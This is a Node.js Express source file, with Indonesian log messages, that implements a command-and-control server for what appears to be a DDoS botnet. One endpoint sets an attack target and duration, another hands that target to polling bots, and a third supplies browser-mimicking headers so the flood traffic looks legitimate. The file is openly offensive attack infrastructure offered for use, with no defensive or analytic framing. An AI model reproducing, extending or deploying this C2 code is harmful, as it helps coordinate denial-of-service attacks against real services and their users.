const express = require("express");
const app = express();
const cors = require("cors");
const os = require("os");
const https = require("https");
const fs = require("fs");

app.use(cors());
app.use(express.json());

let currentTarget = null;
let attackTime = 0;

app.post("/set", (req, res) => {
  const { target, time } = req.body;
  currentTarget = target;
  attackTime = time;
  console.log(`[C2] Serangan dimulai ke ${target} selama ${time} detik`);
  res.json({ status: "OK" });
});

app.get("/status", (req, res) => {
  res.json({ target: currentTarget, time: attackTime });
});

app.get("/headers", (req, res) => {
  res.json({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "text/html,application/xhtml+xml,application/xml",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
  });
});

const PORT = Math.floor(Math.random() * (65535 - 1024) + 1024);
const ifaces = os.networkInterfaces();
let ip = "localhost";

for (let iface in ifaces) {
  for (let i of ifaces[iface]) {
    if (i.family === "IPv4" && !i.internal) ip = i.address;
  }
}

app.listen(PORT, () => {
  console.log(`\nAPI C2NYA : http://${ip}:${PORT}\n`);
});
